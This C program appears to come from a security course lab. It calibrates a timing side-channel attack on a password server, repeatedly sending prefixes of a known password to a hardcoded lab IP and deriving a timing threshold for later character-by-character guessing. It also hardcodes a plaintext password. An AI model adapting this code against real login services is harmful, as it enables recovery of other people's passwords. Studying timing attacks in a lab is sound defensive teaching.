#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

#define BUF_SIZE 256
#define PORT 39393

//add your own ip here if you'd like to test!
#define jason_ip "192.168.0.190"
#define shan_ip "192.168.1.46"
#define shan_linux_ip "128.252.167.161"
#define shan_lab_ip "192.168.122.1"
char* ip = shan_lab_ip; //change this to your Linux lab IP address

//known username and password of the hacker
char* USERNAME = "shan";
char* PASSWORD = "shannon_password_super_secret";

#define NUM_ITERS 1000
#define BUFFER_PERCENT 0.8 //lowers threshold a bit to make hack a little faster

struct timespec req_before, req_after;
const int max_expected_args = 2;


//tests validity of username (user) and password (pass) pair
//sends these to server and checks response
//returns -1 if read from server fails
//otherwise, returns time it takes for password to be verified by server
double test_creds(char* user, char* pass, int username_size, int password_size, int socket) {
    //send username
    int result;
    char response[BUF_SIZE];
    send(socket, user, username_size, 0);

    //wait for server before sending password
    if ((result = read(socket, response, sizeof(response))) == -1) {
        perror("read failed");
        return -1;
    } else if (result == 0) {
        perror("server closed");
        return -1;
    }

    //send password
    send(socket, pass, password_size, 0);
    clock_gettime(CLOCK_MONOTONIC, &req_before); //record time before
    result = read(socket, response, sizeof(response));
    clock_gettime(CLOCK_MONOTONIC, &req_after); //record time after

    if (result == -1) {
        perror("read failed");
        return -1;
    } else if (result == 0) {
        perror("server closed");
        return -1;
    }

    //calculate time taken by server to process password
    double time = req_after.tv_nsec - req_before.tv_nsec;
    if (time < 0) time += 1000000000;
    return time / 1000;
}

int main(int argc, char const* argv[]) {
    if (argc > max_expected_args || argc < 1) {
        printf("usage: ./threshold\n");
        exit(EXIT_FAILURE);
    }

    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("error creating socket\n");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if(inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
	    perror("error in init_pton\n");
	    exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("failed to connect\n");
	    exit(EXIT_FAILURE);
    }

    printf("connected\n");

    int NUM_TESTS = strlen(PASSWORD);
    double test;
    double tests[NUM_TESTS];
    char guess[BUF_SIZE];

    //run a series of tests for every letter in the password
    //first test just the first letter, then the first two letters, etc.
    for (int i = 0; i < NUM_TESTS; i++) {
        //copy first i+1 characters into guess, then insert incorrect character
        strncpy(guess, PASSWORD, i+1);
        guess[i+1] = '\0';
        printf("guessing password %s\n", guess);
        tests[i] = 0;

        //average NUM_ITERS test results on this guess
        for (int j = 0; j < NUM_ITERS; j++) {
            test = test_creds(USERNAME, guess, strlen(USERNAME), strlen(guess), sock);
            //printf("test = %lf\n", test);
            
            if (test == -1) exit(EXIT_FAILURE);
            tests[i] += test / 1000;
        }

        tests[i] *= 1000 / NUM_ITERS;
    }

    //calculate threshold by taking the minimum difference in average times
    double threshold = 0;
    double diff;
    for (int i = 0; i < NUM_TESTS - 1; i++) {
        diff = tests[i+1] - tests[i];
        printf("diff is %lf - %lf = %lf\n", tests[i+1], tests[i], diff);
        if (threshold == 0 || diff < threshold) {
            threshold = diff;
            printf("threshold is now %lf\n", threshold);
        }
    }
    threshold *= BUFFER_PERCENT; //a lowered threshold makes the hack easier

    close(sock);

    printf("Threshold is %lf\n", threshold);
    return threshold;
}
